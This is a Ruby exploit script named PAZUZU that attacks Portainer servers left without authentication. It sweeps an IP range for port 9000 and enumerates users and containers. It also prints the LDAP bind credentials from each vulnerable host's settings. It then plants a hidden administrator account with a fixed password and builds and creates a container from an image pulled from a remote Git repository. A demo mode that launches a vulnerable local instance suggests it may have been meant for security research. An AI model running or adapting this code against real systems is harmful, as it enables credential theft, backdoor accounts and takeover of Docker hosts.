#!/usr/bin/ruby
# PAZUZU (Portainer Authentication Zap Using Zero Utilities)
# Mauro Eldritch @ Ministerio de Produccion Argentina - 2018

require 'socket'    
require 'timeout'   
require 'ipaddr'    
require 'net/http'  
require 'uri'       
require 'json'

#Main
def main()
    $myaddress = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
    $port = "9000"                                      # Port where Portainer runs.
    $hosts_vulnerables = 0                              # Vulnerable Hosts.
    $portainer_hosts = []                               # Hosts with Portainer instances.
    $vulnerable_hosts = []                              # Hosts with vulnerable Portainer instances.
    $cantidad_usuarios = 0
    $cantidad_containers = 0
    system("clear")                                     # Clear Screen
    puts banner = `cat pazuzu.dat`                      # Display Banner
    if ARGV.length == 2                                 # Abort if not enough args.
        $ip_a = ARGV[0]                                 # First IP.
        $ip_z = ARGV[1]                                 # Last IP.    
    elsif ARGV.length == 1 && ARGV[0].to_s.chomp() == "-d"
        explotacion_local()
    else
        puts "[?] USAGE:"
        puts "[?] Scan a given range: #{__FILE__} IP_START IP_END"  
        puts "[?] Raise a local vulnerable instance: #{__FILE__} -d"  
        exit 1
    end
end

#Raise a local instance
def explotacion_local()
    puts "[!] Starting a vulnerable local Portainer instance:"
    `docker run -d -p "#{$port}":9000 -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data_poc:/data portainer/portainer --no-auth`
    instances=`docker ps | grep portainer | awk '{print $1" | "$2" | "$3" "$4" | "$13}'`
    puts instances
    puts "\nYou should browse your local instance on port 9000, and click the 'Endpoints' menu under Settings."
    puts "Configure the main endpoint as 'Local'."
    puts "Configure yout Endpoint URL to your_network_address:2375"
    puts "Example using your current address: #{$myaddress}:2375"
    puts "To safely kill this vulnerable instance, invoke exorcist.rb. Avoid killing it manually."
    exit 0
end

#Calculate IP Range.
def crear_rango_ip(primer_ip, ultimo_ip)            # Compute IP range.
    primer_ip = IPAddr.new(primer_ip)               # Starting IP.
    ultimo_ip   = IPAddr.new(ultimo_ip)             # Ending IP.
    (primer_ip..ultimo_ip).map(&:to_s)              # Map the range.
end

#Check if Portainer is available (Vulnerable or not)
def portainer?(ip, segundos=1)                      
    Timeout::timeout(segundos) do                   
        begin
            TCPSocket.new(ip, "#{$port}").close     # Check Portainer port.
            true
        rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH, SocketError
            false                                   # If Exception, do not count this host.
        end
    end
    rescue Timeout::Error                           # If Timeout, do not count this host.
        false
end

#Create an inventory of Portainer instances (General: Vulnerable or not).
def inventario_portainer()
    $rango_ip = crear_rango_ip($ip_a, $ip_z)        
    $rango_ip.each do | ip |                        
        if portainer?(ip)                           
            $portainer_hosts.push(ip)               
        end
    end
end

#Create an inventory of Portainer instances (Vulnerable only).
def inventario_vulnerables()
    inventario_portainer()                              # Invoke a General Inventory.
    $portainer_hosts.each do | ip |                     
        uri = URI.parse("http://#{ip}:#{$port}/api/status") 
        response = Net::HTTP.get_response(uri)          
        json_response = JSON.parse(response.body)       
        auth = json_response["Authentication"]          # If no Auth is needed to access.
        if auth.to_s.chomp() == "false"                 
            $hosts_vulnerables += 1                     
            $vulnerable_hosts.push(ip)                  
        end
    end
end

#Exploit each vulnerable API call.
def exploit()
    main()                                              
    inventario_vulnerables()                            
    $vulnerable_hosts.each do | ip |                    
    #List Users
        begin
            uri = URI.parse("http://#{ip}:#{$port}/api/users")
            response = Net::HTTP.get_response(uri)            
            json_response = JSON.parse(response.body)         
            cantidad_usuarios = json_response.count-1         
            puts "\n[*][#{ip}]\nUsers:"
            (0..cantidad_usuarios).each do | x|
                $cantidad_usuarios += 1
                privs = ""                                          # If user is admin.
                if json_response[x]["Role"].to_s.chomp() == "1"
                    privs = "[Admin]"
                end
                puts "\t-" + json_response[x]["Username"] + " " + privs
            end
        rescue
            puts "\n[!] Error extracting users on #{ip}."
        end
    #List Configs
        begin
            uri = URI.parse("http://#{ip}:#{$port}/api/settings")
            response = Net::HTTP.get_response(uri)            
            json_response = JSON.parse(response.body)
            puts "\n[*][#{ip}]\nSettings:"
            puts "\t- LDAP User: " + json_response["LDAPSettings"]["ReaderDN"]
            puts "\t- LDAP Pass: " + json_response["LDAPSettings"]["Password"]
            puts "\t- LDAP Host: " + json_response["LDAPSettings"]["URL"]
        rescue
            puts "\n[!] Error extracting settings on #{ip}."
        end    
    #List Containers
       begin
            uri = URI.parse("http://#{ip}:#{$port}/api/endpoints/1/docker/containers/json")
            response = Net::HTTP.get_response(uri)                                      
            json_response = JSON.parse(response.body) 
            cantidad_containers = json_response.count-1
            puts "\n[*][#{ip}]\nContainers:"
            (0..cantidad_containers).each do | x|
                $cantidad_containers += 1
               puts "\t-" + json_response[x]["Names"][0] + "(" + json_response[x]["Image"] +")" 
            end
        rescue
            puts "\n[!] Error extracting containers on #{ip}."
       end        
    #Inject malicious user: CaptainHowdy
        begin
            uri = URI.parse("http://#{ip}:#{$port}/api/users")
            request = Net::HTTP::Post.new(uri)                
            request.content_type = "application/json"         
            request.body = JSON.dump({                        
                "Username" => "CapitanHowdy",
                "Password" => "FuckYouKarras",
                "Role" => 1                                                             # Role 1 = Administrador
                })
            response = Net::HTTP.start(uri.hostname, uri.port) do |http|
                http.request(request)
            end
            json_response = JSON.parse(response.body)
            id = json_response["Id"].to_s
            if id.chomp() == ""
                id = "0"
            end
            puts "\n[*][#{ip}]\nMalicious User Injected:"
            puts "\t- Malicious User CapitanHowdy created with ID " + id + ". Password: 'FuckYouKarras'."
        rescue
            puts "\n[!] Error injecting malicious user on #{ip}."
        end
    #Inject malicious image "yacareteam/pazuzu"
        begin
            uri = URI.parse("http://#{ip}:#{$port}/api/endpoints/1/docker/build?t=yacareteam/pazuzu:latest&remote=https://github.com/mauroeldritch/pazuzu.git&dockerfile=Dockerfile")
            request = Net::HTTP::Post.new(uri)
            req_options = {
              use_ssl: uri.scheme == "https",
            }
            response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
                http.request(request)
            end
            puts "\n[*][#{ip}]\nMalicious Image Injected:"
            puts "\t- Malicious Image created."
        rescue
            puts "\n[!] Error injecting malicious image on #{ip}."
        end
    #Inject malicious container "yacareteam/pazuzu"
    begin
        uri = URI.parse("http://#{ip}:#{$port}/api/endpoints/1/docker/containers/create?name=pazuzu")
        request = Net::HTTP::Post.new(uri)
        request.content_type = "application/json"
        request.body = JSON.dump({
          "Image" => "yacareteam/pazuzu"
        })
        response = Net::HTTP.start(uri.hostname, uri.port) do |http|
          http.request(request)
        end
        json_resp = JSON.parse(response.body)
        $containerid = json_resp["Id"].to_s
        puts "\n[*][#{ip}]\nMalicious Container Injected:"
        puts "\t- Malicious Container yacareteam/pazuzu created with ID #{$containerid} ."
    rescue
        puts "\n[!] Error injecting malicious container on #{ip}."
    end
    end
    #Final stats
    puts "\n[*] Final Stats:"
    puts "[!] #{$hosts_vulnerables} vulnerable hosts."
    puts "[!] #{$cantidad_usuarios} vulnerable user accounts."
    puts "[!] #{$cantidad_containers} vulnerable containers."
end

#Go for it, you handsome devil!
exploit()
